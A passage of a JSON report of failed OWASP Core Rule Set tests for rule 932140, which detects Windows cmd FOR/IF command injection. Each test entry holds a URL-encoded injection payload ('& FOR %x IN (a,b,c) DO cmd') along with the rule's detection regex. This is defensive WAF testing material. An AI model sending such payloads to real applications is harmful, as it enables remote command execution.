          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 24,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)" ]
    },
    "test" : {
      "test_id" : 24,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=%26+FOR+%25%2F+IN+%28a%2Cb%2Cc%29+DO+cmd",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 25,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)" ]
    },
    "test" : {
      "test_id" : 25,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=%26+FOR+%25%40+IN+%28a%2Cb%2Cc%29DO+cmd",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 26,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)" ]
    },
    "test" : {
      "test_id" : 26,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=%26+FOR+%25%5B+IN+%28a%2Cb%2Cc%29DO+cmd",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 27,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)" ]
    },
    "test" : {
      "test_id" : 27,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=%26+FOR+%25%5D+IN+%28a%2Cb%2Cc%29DO+cmd",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 28,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)" ]
    },
    "test" : {
      "test_id" : 28,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=%26+FOR+%25%7E+IN+%28a%2Cb%2Cc%29DO+cmd",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
